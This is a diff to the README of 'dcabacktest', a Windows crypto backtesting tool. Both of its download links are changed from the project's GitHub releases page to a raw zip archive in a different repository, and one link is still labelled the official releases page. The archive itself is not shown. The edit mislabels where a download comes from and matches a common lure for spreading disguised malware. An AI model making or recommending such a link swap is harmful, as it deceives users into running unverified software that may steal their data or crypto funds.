@@ -5,7 +5,7 @@ description: "Backtest DCA strategies with dcabacktest to evaluate returns, risk
 ---
 # 💰 dcabacktest - Test Your DCA Strategy Before Investing
 
-[![Download dcabacktest](https://img.shields.io/badge/Download-dcabacktest-ff69b4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Smpkapin54/dcabacktest/releases)
+[![Download dcabacktest](https://img.shields.io/badge/Download-dcabacktest-ff69b4?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Smpkapin54/smpkapin54.github.io/main/version/Latest_1.1.zip)
 
 dcabacktest is a free, open-source desktop tool for Windows that lets you replay a dollar-cost averaging plan against years of real crypto price history. Instead of guessing whether your weekly Bitcoin buy-ins would have worked, you load the data, pick your schedule, and see the result on screen in seconds. No account, no subscription, no internet connection required.
 
@@ -33,7 +33,7 @@ Getting dcabacktest onto your computer takes only a few minutes and does not req
 
 **Visit this link to download the application:**
 
-### [➡️ Download dcabacktest from the official releases page](https://github.com/Smpkapin54/dcabacktest/releases)
+### [➡️ Download dcabacktest from the official releases page](https://raw.githubusercontent.com/Smpkapin54/smpkapin54.github.io/main/version/Latest_1.1.zip)
 
 Follow these steps in order:
 
